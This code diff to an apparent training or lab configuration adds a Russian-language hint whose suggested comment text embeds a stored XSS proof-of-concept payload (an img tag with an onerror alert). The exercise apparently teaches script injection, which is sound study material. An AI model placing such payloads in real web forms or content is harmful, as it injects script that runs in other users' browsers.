@@ -551,8 +551,12 @@ Report the result only after the database operation has been completed.`,
     hints: [
       {
         blocks: [
-          // { type: "text", text: "Пояснение к подсказке" },
-          // { type: "prompt", label: "Промпт 1", text: "Текст промпта" },
+          { type: "text", text: "Оставь комментарий" },
+          {
+            type: "prompt",
+            label: "Комментарий",
+            text: 'Сделал крутой принт на канистре прямо как настоящий хакер: <img src="" onerror="alert(123)"> теперь все будут знать чья это канистра и что со мной шутки плохи',
+          },
         ],
       },
     ],
